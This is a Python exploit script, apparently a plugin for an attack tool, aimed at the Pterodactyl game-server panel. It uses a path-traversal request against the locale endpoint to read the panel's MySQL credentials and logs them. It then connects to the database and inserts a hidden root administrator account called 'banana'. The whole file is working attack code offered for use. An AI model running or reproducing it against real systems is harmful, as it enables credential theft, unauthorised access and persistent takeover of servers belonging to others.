import mysql.connector
import bcrypt
import logging
import warnings
import urllib3
import requests
from requests.exceptions import RequestException
from plugins.common import *
import string

def exploit(target_url):
    warnings.filterwarnings("ignore", category=UserWarning)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    target_url = target_url.strip().rstrip('/') + '/'
    endpoint = f"{target_url}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

    try:
        response = requests.get(endpoint, allow_redirects=True, timeout=5, verify=False)

        if response.status_code == 200 and "pterodactyl" in response.text.lower():
            try:
                raw_data = response.json()
                data = raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"]
                logging.info(f"Host: {data['host']}")
                logging.info(f"Port: {data['port']}")
                logging.info(f"Database: {data['database']}")
                logging.info(f"Username: {data['username']}")
                logging.info(f"Password: {data['password']}")
                return data
            except (KeyError, TypeError):
                logging.info("Vulnerable but no database information available")
                return None
        else:
            logging.error("Not vulnerable or data not found")
            return None
    except RequestException as e:
        if "NameResolutionError" in str(e):
            logging.error("Invalid target or unable to resolve domain")
        else:
            logging.error(f"Request error: {e}")
        return None


def ptero(target_url):
    data = exploit(target_url)
    if not data:
        logging.info("No database info provided. Cannot create admin user.")
        return

    email = "banana@us.gov"
    username = "banana"
    first_name = "Banana"
    last_name = "Republic"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    uuid_str = str(uuid.uuid4())

    try:
        conn = mysql.connector.connect(
            host=data['host'],
            port=int(data['port']),
            user=data['username'],
            password=data['password'],
            database=data['database']
        )
    except mysql.connector.Error as err:
        logging.error(f"{err}")
        return

    cursor = conn.cursor()
    hashed_pw = bcrypt.hashpw(password.encode(), bcrypt.gensalt(10)).decode()

    sql = """
    INSERT INTO users (
        external_id, uuid, username, email, name_first, name_last, password,
        remember_token, language, root_admin, use_totp, totp_secret, totp_authenticated_at,
        gravatar, created_at, updated_at
    ) VALUES (
        NULL, %s, %s, %s, %s, %s, %s,
        %s, 'en', 1, 0, NULL, NULL,
        1, NOW(), NOW()
    )
    """

    try:
        remember_token = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
        cursor.execute(sql, (
            uuid_str,
            username,
            email,
            first_name,
            last_name,
            hashed_pw,
            remember_token
        ))
        conn.commit()
        logging.success(f"Admin user created! {email}:{username}:{password}")
    except mysql.connector.Error as err:
        logging.error(f"Failed to add admin user: {err}")
    finally:
        cursor.close()
        conn.close()